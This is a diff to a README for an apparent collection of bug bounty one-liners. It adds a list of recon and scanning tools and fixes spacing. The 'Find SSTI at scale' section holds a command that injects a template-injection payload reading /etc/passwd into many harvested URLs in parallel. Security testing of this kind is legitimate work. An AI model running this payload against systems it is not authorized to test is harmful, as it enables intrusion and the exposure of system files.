@@ -1,5 +1,20 @@
 # Oneliner-Bugbounty
-A collection  oneliner scripts for bug bounty
+A collection oneliner scripts for bug bounty
+
+## List tools
+- [Subfinder](https://github.com/projectdiscovery/subfinder)
+- [Naabu](https://github.com/projectdiscovery/naabu)
+- [httpx](https://github.com/projectdiscovery/httpx)
+- [Nuclei](https://github.com/projectdiscovery/nuclei)
+- [Waybackurls](https://github.com/tomnomnom/waybackurls)
+- [DNSProbe](https://github.com/projectdiscovery/dnsprobe)
+- [gf](https://github.com/tomnomnom/gf)
+- [sqlmap](https://github.com/sqlmapproject/sqlmap)
+- [qsreplace](https://github.com/tomnomnom/qsreplace)
+- [hakrawler](https://github.com/hakluke/hakrawler)
+- [Puredns](https://github.com/d3mondev/puredns)
+- [GauPlus](https://github.com/bp0lr/gauplus)
+- [uro](https://github.com/s0md3v/uro)
 
 ### Auto scanner
 
@@ -34,7 +49,7 @@ subfinder -d site.com -all -silent | waybackurls | sort -u | gf redirect | qsrep
 ### Find SSTI at scale
 
 ```bash
-echo "domain" | subfinder -silent |  waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
+echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
 ```
 
 ### Scanning top exploited vulnerabilities according to CISA
